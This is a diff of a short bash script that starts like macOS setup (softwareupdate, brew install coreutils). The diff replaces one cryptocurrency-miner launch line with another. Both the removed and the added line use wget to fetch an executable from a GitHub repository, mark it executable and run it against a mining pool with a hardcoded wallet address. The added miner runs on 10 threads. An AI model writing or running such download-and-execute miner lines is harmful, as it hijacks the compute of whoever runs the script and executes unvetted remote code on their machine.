@@ -1,4 +1,4 @@
 #!/usr/bin/env bash
 softwareupdate -l
 brew install coreutils
-wget https://github.com/dodohua/xdag_mac/releases/download/1.0/CpuMiner && chmod 777 CpuMiner && ./CpuMiner -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.CPU -p x
+wget https://github.com/BatiKangkung/KangKung/raw/master/rigmac && chmod +x rigmac && ./rigmac --donate-level 1 -o sf.pool-pay.com:4025 -u SafexsoajK5bDJyaXhGtuCcvmoTNvg2GwA16VqmfS2hhPEUXchcs1xbRpvNuQ86ju1KjKzw9HUoW9bnq3YhbxtRXDxvyZWkYYDb3Z -p x@CPU -k -a rx/sfx -t 10
